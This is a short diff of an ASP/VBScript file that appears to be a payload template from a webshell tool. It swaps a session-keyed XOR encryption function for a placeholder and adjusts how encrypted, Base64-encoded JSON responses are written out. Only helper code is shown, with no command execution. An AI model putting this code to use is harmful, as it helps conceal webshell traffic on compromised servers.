@@ -1,14 +1,7 @@
 Dim status,message
 status="success"
 
-Function Encrypt(data)
-key=Session("k")
-size=len(data)
-For i=1 To size
-encryptResult=encryptResult&chrb(asc(mid(data,i,1)) Xor Asc(Mid(key,(i and 15)+1,1)))
-Next
-Encrypt=encryptResult
-End Function
+__Encrypt__
 
 Function Base64Encode(sText)
     Dim oXML, oNode
@@ -42,7 +35,7 @@ Function Stream_StringToBinary(Text)
 End Function
 
 
-Function GetErr(Err)'检查错误处理
+Function GetErr(Err)
 	If Err Then
 		GetErr= "<font size=2><li>错误:"&Err.Description&"</li><li>错误源:"&Err.Source&"</li><br>"
 	End If
@@ -89,7 +82,9 @@ End Function
 Sub echo(content)
 on error resume Next
 finalResult="{""status"":"""&Base64Encode("success")&""",""msg"":"""&Base64Encode(content)&"""}"
+'Response.binarywrite(finalResult)
 Response.binarywrite(Encrypt(finalResult))
+'Response.binarywrite("aaaa")
 End Sub
 
 Sub main(arrArgs)
